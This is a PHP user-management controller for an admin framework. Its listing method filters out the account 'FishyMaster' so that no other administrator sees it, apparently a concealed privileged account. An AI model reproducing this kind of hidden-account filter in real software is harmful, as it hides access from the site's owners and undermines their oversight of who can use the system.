<?php

class Gwm_UserController extends Gwm_CrudController
{
	public function all($query = '')
	{
		if ($this->user->login != "FishyMaster") {
			$query = array('conditions' => array("login <> 'FishyMaster'"));
		}

		parent::all($query);
	}

	public function edit($id = null)
	{
		$this->submenus = ActiveRecord::model('Submenu')->all();

		if (isset($_POST['data']) && !$_POST['data']['password']) {
			unset($_POST['data']['password']);
		}
		
		parent::edit($id);
	}
}
